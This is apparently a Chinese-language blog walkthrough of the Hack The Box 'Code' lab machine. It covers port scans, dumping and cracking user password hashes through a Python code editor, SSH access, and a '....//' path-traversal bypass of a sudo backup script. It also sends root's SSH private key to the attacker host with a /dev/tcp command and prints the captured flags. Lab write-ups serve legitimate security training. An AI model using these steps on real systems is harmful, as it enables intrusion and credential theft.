{"pageProps":{"postData":{"id":"HackTheBoxSeason7-Code","contentHtml":"<h1>Season7-Code</h1>\n<blockquote>\n<p><a href=\"https://app.hackthebox.com/machines/653\">https://app.hackthebox.com/machines/653</a> | <code>esay</code></p>\n</blockquote>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~  nmap -sT -min-rate 10000 -p- 10.10.11.62\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:09 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.62\nHost is up (0.15s latency).\nNot shown: 64591 filtered tcp ports (no-response), 943 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 37.29 seconds\n</code></pre>\n<p>就扫描出一个<code>22</code>端口，不对劲继续扫</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Code  nmap -sS -min-rate 10000 -p- 10.10.11.62\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:34 EDT\nWarning: 10.10.11.62 giving up on port because retransmission <span class=\"hljs-built_in\">cap</span> hit (10).\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.62\nHost is up (0.84s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n5000/tcp open  upnp\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 33.23 seconds\n</code></pre>\n<p>新端口是一个代码编辑器<code>Python Code Editor</code></p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Code  nmap -sT -A -T4 -O -p 22,5000 10.10.11.62     \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-03-24 22:30 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.11.62\nHost is up (0.20s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:<span class=\"hljs-built_in\">df</span>:51:a2:7a:bd (RSA)\n|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)\n|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)\n5000/tcp open  http    Gunicorn 20.0.4\n|_http-title: Python Code Editor\n|_http-server-header: gunicorn/20.0.4\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   204.69 ms 10.10.16.1\n2   156.61 ms 10.10.11.62\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 34.11 seconds\n</code></pre>\n<h2>WEB 渗透</h2>\n<p>可以执行python命令，首先尝试一下<code>os</code> 库</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Code/image56.png\" alt=\"image.png\"></p>\n<p>提示<code>Use of restricted keywords is not allowed.</code> 经过测试是将<code>import</code> 、<code>os</code> 等关键字给过滤了</p>\n<p>右边可以创建账户，这里创建了用户<code>sunset</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Code/image57.png\" alt=\"image.png\"></p>\n<p>可以看到存在<code>MyCodes</code> ，我们将代码保存为<code>test</code>试试</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Code/image58.png\" alt=\"image.png\"></p>\n<p>尝试一下语法注入</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Code/image59.png\" alt=\"image.png\"></p>\n<p>可以成功回显，再尝试一下使用模板语法</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Code/image60.png\" alt=\"image.png\"></p>\n<p>也是成功回显了，那么该应用是使用<code>Flask</code>搭建的<code>Web</code>应用</p>\n<p>使用<code>SSTImap</code>尝试模板注入</p>\n<pre><code class=\"hljs language-bash\">python sstimap.py -u http://10.10.11.62:5000/run_code -H <span class=\"hljs-string\">'application/x-www-form-urlencoded; charset=UTF-8'</span> -m <span class=\"hljs-string\">'POST'</span> -d <span class=\"hljs-string\">'code=print(render_template_string(\"{{*}}\"))'</span>\n</code></pre>\n<p>结果就是没办法利用，但是知道了存在<code>jinja2</code></p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Code/image61.png\" alt=\"image.png\"></p>\n<p>因为存在登陆操作，所以可能可以进行操作数据库，尝试一下数据库语法</p>\n<p><img src=\"/post-images/HackTheBoxSeason7-Code/image62.png\" alt=\"image.png\"></p>\n<p>有回显，通过<code>GPT</code>进行构造</p>\n<pre><code class=\"hljs language-bash\">code=<span class=\"hljs-built_in\">print</span>([user.username <span class=\"hljs-keyword\">for</span> user <span class=\"hljs-keyword\">in</span> User.query.all()])\n// output\n{<span class=\"hljs-string\">\"output\"</span>:<span class=\"hljs-string\">\"['development', 'martin', 'test']\\n\"</span>}\n</code></pre>\n<pre><code class=\"hljs language-bash\">\ncode=<span class=\"hljs-built_in\">print</span>([user.password <span class=\"hljs-keyword\">for</span> user <span class=\"hljs-keyword\">in</span> User.query.all()])\n// output\n{<span class=\"hljs-string\">\"output\"</span>:<span class=\"hljs-string\">\"['759b74ce43947f5f4c91aeddc3e5bad3', '3de6f30c4a09c27fc71932bfc68474be', '098f6bcd4621d373cade4e832627b4f6']\\n\"</span>}\n</code></pre>\n<p>得到两组用户名密码<code>development:759b74ce43947f5f4c91aeddc3e5bad3</code> 和<code>martin:3de6f30c4a09c27fc71932bfc68474be</code></p>\n<p>将密码保存到<code>pass.txt</code>使用<code>John</code>破解</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Code  john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 pass.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])\nWarning: no OpenMP support <span class=\"hljs-keyword\">for</span> this <span class=\"hljs-built_in\">hash</span> <span class=\"hljs-built_in\">type</span>, consider --fork=16\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\ndevelopment      (?)     \nnafeelswordsmaster (?)     \n2g 0:00:00:00 DONE (2025-03-25 00:26) 3.333g/s 8711Kp/s 8711Kc/s 9050KC/s nafi79..naerulz\nUse the <span class=\"hljs-string\">\"--show --format=Raw-MD5\"</span> options to display all of the cracked passwords reliably\nSession completed. \n</code></pre>\n<pre><code class=\"hljs language-bash\">development:development\nmartin:nafeelswordsmaster\n</code></pre>\n<p>得到两个账户，直接尝试<code>SSH</code></p>\n<p>最后使用<code>martin</code>成功登录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Code  ssh martin@10.10.11.62\nmartin@10.10.11.62<span class=\"hljs-string\">'s password: \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/pro\n\n System information as of Tue 25 Mar 2025 04:10:56 AM UTC\n\n  System load:           0.3\n  Usage of /:            51.4% of 5.33GB\n  Memory usage:          14%\n  Swap usage:            0%\n  Processes:             234\n  Users logged in:       1\n  IPv4 address for eth0: 10.10.11.62\n  IPv6 address for eth0: dead:beef::250:56ff:feb9:c80e\n\nExpanded Security Maintenance for Applications is not enabled.\n\n0 updates can be applied immediately.\n\nEnable ESM Apps to receive additional future security updates.\nSee https://ubuntu.com/esm or run: sudo pro status\n\nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings\n\nThe programs included with the Ubuntu system are free software;\nthe exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nLast login: Tue Mar 25 04:10:56 2025 from 10.10.16.7\nmartin@code:~$ \n</span></code></pre>\n<h2>Get Flag</h2>\n<p>信息收集一波</p>\n<pre><code class=\"hljs language-bash\">martin@code:~$ <span class=\"hljs-built_in\">uname</span> -a\nLinux code 5.4.0-208-generic <span class=\"hljs-comment\">#228-Ubuntu SMP Fri Feb 7 19:41:33 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\">martin@code:~$ ip add\n1: lo: &#x3C;LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    inet 127.0.0.1/8 scope host lo\n       valid_lft forever preferred_lft forever\n    inet6 ::1/128 scope host \n       valid_lft forever preferred_lft forever\n2: eth0: &#x3C;BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000\n    <span class=\"hljs-built_in\">link</span>/ether 00:50:56:b9:c8:0e brd ff:ff:ff:ff:ff:ff\n    inet 10.10.11.62/23 brd 10.10.11.255 scope global eth0\n       valid_lft forever preferred_lft forever\n    inet6 dead:beef::250:56ff:feb9:c80e/64 scope global dynamic mngtmpaddr \n       valid_lft 86399sec preferred_lft 14399sec\n    inet6 fe80::250:56ff:feb9:c80e/64 scope <span class=\"hljs-built_in\">link</span> \n       valid_lft forever preferred_lft forever\n</code></pre>\n<pre><code class=\"hljs language-bash\">martin@code:~$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> martin on localhost:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser martin may run the following commands on localhost:\n    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh\n</code></pre>\n<p>查看一下我们可以以<code>Root</code>权限运行的脚本</p>\n<pre><code class=\"hljs language-bash\">martin@code:~/backups/home/app-production/app$ <span class=\"hljs-built_in\">cat</span> /usr/bin/backy.sh\n<span class=\"hljs-comment\">#!/bin/bash</span>\n\n<span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-variable\">$#</span> -ne 1 ]]; <span class=\"hljs-keyword\">then</span>\n    /usr/bin/echo <span class=\"hljs-string\">\"Usage: <span class=\"hljs-variable\">$0</span> &#x3C;task.json>\"</span>\n    <span class=\"hljs-built_in\">exit</span> 1\n<span class=\"hljs-keyword\">fi</span>\n\njson_file=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>\"</span>\n\n<span class=\"hljs-keyword\">if</span> [[ ! -f <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$json_file</span>\"</span> ]]; <span class=\"hljs-keyword\">then</span>\n    /usr/bin/echo <span class=\"hljs-string\">\"Error: File '<span class=\"hljs-variable\">$json_file</span>' not found.\"</span>\n    <span class=\"hljs-built_in\">exit</span> 1\n<span class=\"hljs-keyword\">fi</span>\n\nallowed_paths=(<span class=\"hljs-string\">\"/var/\"</span> <span class=\"hljs-string\">\"/home/\"</span>)\n\nupdated_json=$(/usr/bin/jq <span class=\"hljs-string\">'.directories_to_archive |= map(gsub(\"\\\\.\\\\./\"; \"\"))'</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$json_file</span>\"</span>)\n\n/usr/bin/echo <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$updated_json</span>\"</span> > <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$json_file</span>\"</span>\n\ndirectories_to_archive=$(/usr/bin/echo <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$updated_json</span>\"</span> | /usr/bin/jq -r <span class=\"hljs-string\">'.directories_to_archive[]'</span>)\n\n<span class=\"hljs-function\"><span class=\"hljs-title\">is_allowed_path</span></span>() {\n    <span class=\"hljs-built_in\">local</span> path=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">$1</span>\"</span>\n    <span class=\"hljs-keyword\">for</span> allowed_path <span class=\"hljs-keyword\">in</span> <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${allowed_paths[@]}</span>\"</span>; <span class=\"hljs-keyword\">do</span>\n        <span class=\"hljs-keyword\">if</span> [[ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$path</span>\"</span> == <span class=\"hljs-variable\">$allowed_path</span>* ]]; <span class=\"hljs-keyword\">then</span>\n            <span class=\"hljs-built_in\">return</span> 0\n        <span class=\"hljs-keyword\">fi</span>\n    <span class=\"hljs-keyword\">done</span>\n    <span class=\"hljs-built_in\">return</span> 1\n}\n\n<span class=\"hljs-keyword\">for</span> <span class=\"hljs-built_in\">dir</span> <span class=\"hljs-keyword\">in</span> <span class=\"hljs-variable\">$directories_to_archive</span>; <span class=\"hljs-keyword\">do</span>\n    <span class=\"hljs-keyword\">if</span> ! is_allowed_path <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$dir</span>\"</span>; <span class=\"hljs-keyword\">then</span>\n        /usr/bin/echo <span class=\"hljs-string\">\"Error: <span class=\"hljs-variable\">$dir</span> is not allowed. Only directories under /var/ and /home/ are allowed.\"</span>\n        <span class=\"hljs-built_in\">exit</span> 1\n    <span class=\"hljs-keyword\">fi</span>\n<span class=\"hljs-keyword\">done</span>\n\n/usr/bin/backy <span class=\"hljs-string\">\"<span class=\"hljs-variable\">$json_file</span>\"</span>\n</code></pre>\n<p>脚本接收<code>task.json</code> ，读取 <code>directories_to_archive</code> 字段的目录列表，只允许 <code>/var/</code> 和 <code>/home/</code> 目录下的路径，其他路径会触发错误并退出</p>\n<p>尝试构造<code>Json</code>文件<code>task.json</code></p>\n<pre><code class=\"hljs language-bash\">{\n\t<span class=\"hljs-string\">\"directories_to_archive\"</span>:[\n\t\t<span class=\"hljs-string\">\"/home/app-production/\"</span>\n\t]\n}\n// run\nmartin@code:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/backy.sh task.json \n2025/03/25 06:38:38 🍀 backy 1.2\n2025/03/25 06:38:38 📋 Working with task.json ...\n2025/03/25 06:38:38 🔰 Task configuration: destination must be specified!\n2025/03/25 06:38:38 ❗ Can<span class=\"hljs-string\">'t read provided task configuration\n</span></code></pre>\n<p>缺少<code>desination</code>参数，应该是保存到哪的参数</p>\n<pre><code class=\"hljs language-bash\">{\n\t<span class=\"hljs-string\">\"directories_to_archive\"</span>:[\n\t\t<span class=\"hljs-string\">\"/home/app-production/\"</span>\n\t],\n\t<span class=\"hljs-string\">\"destination\"</span>:<span class=\"hljs-string\">\"/home/martin\"</span>\n}\n// run\nmartin@code:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/backy.sh task.json \n2025/03/25 06:41:28 🍀 backy 1.2\n2025/03/25 06:41:28 📋 Working with task.json ...\n2025/03/25 06:41:28 💤 Nothing to <span class=\"hljs-built_in\">sync</span>\n2025/03/25 06:41:28 📤 Archiving: [/home/app-production]\n2025/03/25 06:41:28 📥 To: /home/martin ...\n2025/03/25 06:41:28 📦\n</code></pre>\n<p>执行完成后多出来一个压缩包</p>\n<pre><code class=\"hljs language-bash\">martin@code:~$ <span class=\"hljs-built_in\">ls</span>\nbackups  code_home_app-production_2025_March.tar.bz2  task.json\n</code></pre>\n<p>对其进行解压，解压完毕后可以发现是用户<code>app-production</code> 的家目录，并且存在<code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">martin@code:~/home/app-production$ <span class=\"hljs-built_in\">cat</span> user.txt \n4332e6b51ad86bfd87072af615996ff1\n</code></pre>\n<p>再构造读取<code>root</code>的家目录</p>\n<pre><code class=\"hljs language-bash\">{\n\t<span class=\"hljs-string\">\"directories_to_archive\"</span>:[\n\t\t<span class=\"hljs-string\">\"/home/../root/\"</span>\n\t],\n\t<span class=\"hljs-string\">\"destination\"</span>:<span class=\"hljs-string\">\"/home/martin\"</span>\n}\n// run\nmartin@code:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/backy.sh task.json \n2025/03/25 06:46:56 🍀 backy 1.2\n2025/03/25 06:46:56 📋 Working with task.json ...\n2025/03/25 06:46:56 💤 Nothing to <span class=\"hljs-built_in\">sync</span>\n2025/03/25 06:46:56 📤 Archiving: [/home/root]\n2025/03/25 06:46:56 📥 To: /home/martin ...\n2025/03/25 06:46:56 📦\n2025/03/25 06:46:56 💢 Archiving failed <span class=\"hljs-keyword\">for</span>: /home/root\n2025/03/25 06:46:56 ❗ Archiving completed with errors\n</code></pre>\n<p>构造双写绕过</p>\n<pre><code class=\"hljs language-bash\">{\n\t<span class=\"hljs-string\">\"directories_to_archive\"</span>:[\n\t\t<span class=\"hljs-string\">\"/home/....//root/\"</span>\n\t],\n\t<span class=\"hljs-string\">\"destination\"</span>:<span class=\"hljs-string\">\"/home/martin\"</span>\n}\n// run\nrtin@code:~$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/backy.sh task.json \n2025/03/25 06:49:24 🍀 backy 1.2\n2025/03/25 06:49:24 📋 Working with task.json ...\n2025/03/25 06:49:24 💤 Nothing to <span class=\"hljs-built_in\">sync</span>\n2025/03/25 06:49:24 📤 Archiving: [/home/../root]\n2025/03/25 06:49:24 📥 To: /home/martin ...\n2025/03/25 06:49:24 📦\n</code></pre>\n<p>成功，读取root.txt</p>\n<pre><code class=\"hljs language-bash\">martin@code:~/root$ <span class=\"hljs-built_in\">cat</span> root.txt \n372cf788ca3e30b86c01d19cb8bac1d9\n</code></pre>\n<h2>Get Root Shell</h2>\n<p>解压问就按后看到存在<code>.ssh</code>文件夹，并且存在私钥<code>id_rsa</code></p>\n<p>转储私钥到攻击机</p>\n<pre><code class=\"hljs language-bash\">// Kali\n**nc -lvp 1234 > sshkey**\n// Code\n**martin@code:~/root/.ssh$ <span class=\"hljs-built_in\">cat</span> id_rsa > /dev/tcp/10.10.16.7/1234**\n</code></pre>\n<p><img src=\"/post-images/HackTheBoxSeason7-Code/image63.png\" alt=\"image.png\"></p>\n<p>修改权限为<code>600</code> ，并使用私钥进行登录</p>\n<pre><code class=\"hljs language-bash\">⚡ root@kali  ~/Desktop/test/Code  <span class=\"hljs-built_in\">chmod</span> 600 sshkey                      \n⚡ root@kali  ~/Desktop/test/Code  ssh root@10.10.11.62 -i sshkey          \nWelcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)     \n                                                                              \n * Documentation:  https://help.ubuntu.com                                    \n * Management:     https://landscape.canonical.com                            \n * Support:        https://ubuntu.com/pro                                     \n                                                                              \n System information as of Tue 25 Mar 2025 07:10:19 AM UTC                     \n                                                                              \n  System load:           0.0                                                  \n  Usage of /:            51.3% of 5.33GB                                      \n  Memory usage:          13%                                                  \n  Swap usage:            0%                                                   \n  Processes:             236                                                  \n  Users logged <span class=\"hljs-keyword\">in</span>:       1                                                    \n  IPv4 address <span class=\"hljs-keyword\">for</span> eth0: 10.10.11.62                                          \n  IPv6 address <span class=\"hljs-keyword\">for</span> eth0: dead:beef::250:56ff:feb9:4461                        \n                                                                              \n                                                                              \nExpanded Security Maintenance <span class=\"hljs-keyword\">for</span> Applications is not enabled.                \n                                                                              \n0 updates can be applied immediately.                                         \n                                                                              \nEnable ESM Apps to receive additional future security updates.                \nSee https://ubuntu.com/esm or run: <span class=\"hljs-built_in\">sudo</span> pro status                            \n                                       \nFailed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings \n                                                                              \n                                                                              \nLast login: Tue Mar 25 07:10:19 2025 from 10.10.16.7                          \nroot@code:~#                           \n</code></pre>","title":"HackTheBox - Season7-Code","date":"2025-04-04","updated":"2025-04-04","comments":true,"tags":["HackTheBox","Linux靶机","encrypt"],"categories":"靶机","isEncrypted":true},"recentPosts":[{"id":"PWN - 基本ROP","title":"PWN - 基本ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"14"},{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"},{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"},{"id":"HackTheBoxMachine -Support","title":"HackTheBox - Machine - Support","date":"2025-06-05","isEncrypted":false,"year":"2025","month":"06","day":"05"},{"id":"HackTheBoxMachine - Hospital","title":"HackTheBox - Machine - Hospital","date":"2025-06-04","isEncrypted":false,"year":"2025","month":"06","day":"04"}]},"__N_SSG":true}